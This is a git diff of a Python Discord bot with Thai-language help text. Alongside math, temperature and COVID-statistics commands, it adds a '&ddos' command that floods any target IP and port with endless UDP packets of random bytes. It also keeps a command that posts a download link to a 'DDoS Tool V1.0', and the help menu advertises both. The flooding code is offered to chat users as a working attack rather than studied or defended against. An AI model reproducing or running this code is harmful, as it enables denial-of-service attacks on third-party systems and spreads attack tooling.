@@ -10,13 +10,15 @@ import os
 import serial
 import dht11test
 
+
 intents = discord.Intents.default()
 intents.members = True
 
 bot = commands.Bot(command_prefix='&', description="พูดมากว่ะ", intents=intents)
 bot.remove_command('help')
 
-#COVID COMMAND
+
+# COVID COMMAND
 stat_url = "https://covid19.th-stat.com/api/open/"
 
 emo = {
@@ -61,7 +63,6 @@ async def covid_stat(ctx, minimal=False) :
 		for f in final :
 			await ctx.send(f)
 
-
 # Command
 @bot.command()
 async def welcome(ctx):
@@ -75,6 +76,8 @@ async def congrat(ctx):
 	congrat.set_thumbnail(url="https://cdn.discordapp.com/attachments/778868879567880192/780126909421846548/Congrat.gif")
 	await ctx.send(embed = congrat)
 
+
+# OS
 @bot.command()
 async def shutdown(ctx):
 	print("Shutting down...")
@@ -87,6 +90,8 @@ async def restart(ctx):
 	await ctx.send("♻️ Restarting...")
 	os.system('RunBot.py')
 
+
+# Math
 @bot.command()
 async def sum(ctx, numOne: float, numTwo: float):
 	sum = numOne + numTwo
@@ -130,6 +135,12 @@ async def sqrt(ctx, sqrtnum: float, number: int):
 	await ctx.send(f"รากที่ {sqrtnum} ของ {number} = {sqrt}")
 
 @bot.command()
+async def fac(ctx, number: int):
+	fac = math.factorial(number)
+	await ctx.send(f"{number}! = {fac}")
+
+
+@bot.command()
 async def help(ctx):
 	h = discord.Embed(title = "❔ **Help**", color = 0x00FF00)
 	h.add_field(name="ℹ️ ข้อมูลกลุ่ม", value="`&guild`")
@@ -145,7 +156,8 @@ async def help(ctx):
 	h.add_field(name="🌡 ตรวจสอบอุณหภูมิและความชื้น", value="`&dht11`")
 	h.add_field(name="🔄 แปลงเปอร์เซ็นต์และตัวเลข", value="`&help_percent`")
 	h.add_field(name="▶️ Youtube Search [ERROR]", value="`&yt [ชื่อคลิป]`")
-	h.add_field(name="🚀 ยิงไอพีโดย DDoS Tool", value="`&ddos`")
+	h.add_field(name="🚀 โปรแกรมยิงไอพี DDoS Tool", value="`&ddosins`")
+	h.add_field(name="📡 ยิงไอพี", value="`&ddos [Target] [Port]`")
 	h.add_field(name="❌ ปิดการทำงานบอท", value="`&shutdown`")
 	h.add_field(name="♻ รีบูตการทำงานบอท", value="`&restart`")
 	await ctx.send(embed = h)
@@ -159,6 +171,7 @@ async def help_math(ctx):
 	hm.add_field(name="`➗` หาร", value="`&div [Num 1] [Num 2]`")
 	hm.add_field(name="💪 ยกกำลัง", value="`&pow [Num 1] [Num 2]`")
 	hm.add_field(name="`√` ถอดราก", value="`&sqrt [Number] [Sqrt Num]`")
+	hm.add_field(name="`!` แฟกทอเรียล", value="`&fac [Number]`")
 	await ctx.send(embed = hm)
 
 @bot.command()
@@ -208,6 +221,8 @@ async def yt(ctx, *, search):
 	# I will put just the first result, you can loop the response to show more results
 	await ctx.send('http://www.youtube.com/watch?v=' + search_results[0])
 
+
+# Temp
 @bot.command()
 async def ctf(ctx, tempc: float):
 	await ctx.send(str(((9*tempc)/5)+32) + ' °F')
@@ -231,6 +246,7 @@ async def ftk(ctx, tempf: float):
 @bot.command()
 async def ktf(ctx, tempk: float):
 	await ctx.send(str((((tempk-273)*9)/5)+32) + ' °F')
+
 
 @bot.command()
 async def covid(ctx) :
@@ -273,6 +289,8 @@ async def square(ctx, size: int):
 			await ctx.send(" "*(size-2), end="")
 			await ctx.send("#")
 
+
+# Percent
 @bot.command()
 async def ptn(ctx, percent: float, total: float):
 	ptn_result = (percent/100)*total
@@ -284,7 +302,7 @@ async def ntp(ctx, number:float, total:float):
 	await ctx.send(f'{number} of {total} = {ntp_result}%')
 
 @bot.command()
-async def ddos(ctx):
+async def ddosins(ctx):
 	ddos = discord.Embed(title = "🚀 **DDoS Tool V1.0**", color = 0x00FF00)
 	ddos.description ="[DOWNLOAD](https://drive.google.com/u/0/uc?export=download&confirm=Qu7_&id=1McyRQuqqqsDYstMCSP2gzCKn7cHt8jgx)"
 	ddos.set_thumbnail(url="https://cdn.discordapp.com/attachments/778868879567880192/781516216987680788/DDoS_LOGO.jpg")
@@ -302,6 +320,7 @@ async def invite(ctx):
 	invite.description ="[Click Here](https://discord.com/oauth2/authorize?client_id=778302031042576395&permissions=247872&scope=bot)"
 	await ctx.send(embed = invite)
 
+# Countdown
 @bot.command()
 async def countdown(ctx, time: int):
 	if time > 100 :
@@ -328,12 +347,27 @@ async def on_message(message):
 @bot.command()			
 async def dht11(ctx):
 	await ctx.send(dht11test.dht11_out())
-	
+
+@bot.command()
+async def ddos(ctx, target:str, port:int):
+		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)	
+		byte = os.urandom(10240)
+
+		sent = 1
+
+		while True:
+			out = ""
+			s.sendto(byte, (target, port))
+			out += f"Sending {sent} To {target} with port {port}"
+			sent = sent + 13466
+
+			await ctx.send(out)
+			sleep(5)
 
 # Events
 @bot.event
 async def on_ready():
-	await bot.change_presence(activity=discord.Game(name="⚙️ Added &dht11"))
+	await bot.change_presence(activity=discord.Game(name="⚙️ Running"))
 	print('Started!')
 
 
